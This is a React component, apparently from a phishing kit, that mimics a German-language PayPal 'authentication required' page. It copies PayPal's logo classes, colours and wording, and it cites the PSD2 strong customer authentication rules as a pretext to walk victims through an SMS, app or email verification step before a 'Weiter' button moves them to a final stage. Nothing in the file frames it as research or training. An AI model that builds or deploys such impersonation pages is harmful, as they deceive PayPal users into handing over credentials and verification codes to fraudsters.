import React, {useEffect, useState} from 'react';
import classes from '../email/Email.module.css'

const AuthVerification = (props) => {

    const [text, setText] = useState('');

    useEffect(() => {
        if (props.state === 1) setText("Mit der SMS")
        else if (props.state === 2) setText("Mit der Paypal-App bestatigen")
        else if (props.state === 3) setText("Mit der Email")
    }, [])

    return (
        <div className={classes.corral}>
            <div className={classes.contentContainerBordered}  style={{border: '0px'}}>
                <header>
                    <p role={"img"}
                       className={[classes.paypal_logo, classes.paypal_logo_long, classes.signin_paypal_logo].join(' ')}></p>
                </header>
                <div className={classes.title}>
                    Authentifizierung erforderlich
                </div>
                <div>
                    <p className={classes.description}>
                        Im Rahmen der uberarbeiteten Zahlungsdiensterichtlinie (PSD2) "Starke Kundenauthentifizierung"
                        benotigen wir weitere informationen, die bestatigen, dass es sich wirklich um Sie handelt
                    </p>
                </div>
                <div style={{ textAlign: "center", marginBottom: "20px"}}>
                    <a href={"#"} style={{color: '#0070BA', fontWeight: '500'}}>
                        Mehr erfahren
                    </a>
                </div>
                <div style={{marginLeft: "20px"}}>
                    {text}
                </div>
                <div id={"loginContent"}>
                    <div id="loginSection">
                        <div className={classes.notifications}></div>
                        <form className={classes.maskable}>
                            <div className={classes.clearfix}>
                                <div className={classes.splitPhoneSection}>
                                    <div style={{textAlign:'center'}}>
                                        <a href="#" id="forgotPassword"
                                           className={[classes.recoveryOption, classes.forgotPassword].join(' ')}
                                           data-client-log-action-type="clickForgotPasswordLink"
                                           pa-marked="1"></a>
                                    </div>

                                </div>
                            </div>
                        </form>
                    </div>
                </div>
                <div className={classes.actions}>
                    <button className={[classes.button].join(' ')} onClick={() => props.setFinal(true)}>
                        Weiter
                    </button>
                </div>
                <div className={classes.intentFooter}>
                    <div className={classes.localeSelector}>
                        <ul className={classes.localeLink}>
                            <li>
                                <a className={classes.selected} style={{color: '#0070BA'}}>Zuruck zum PayPal-Login</a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default AuthVerification;